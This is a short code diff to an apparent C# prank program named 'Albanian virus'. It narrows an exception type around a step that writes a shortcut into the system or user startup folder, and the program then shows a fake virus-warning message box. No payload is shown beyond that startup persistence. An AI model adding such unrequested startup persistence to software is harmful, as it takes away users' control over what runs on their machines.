@@ -30,7 +30,7 @@ namespace Albanian_virus
                 {
                     CreateShortcut(startUp);
                 }
-                catch (Exception)
+                catch (UnauthorizedAccessException)
                 {
                     CreateShortcut(userStartUp);
                 }
@@ -38,7 +38,6 @@ namespace Albanian_virus
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             MessageBox.Show(virusMessage, titleMessage, MessageBoxButtons.YesNoCancel, MessageBoxIcon.Error);
-            
         }
 
         public static void CreateShortcut(string targetPath)
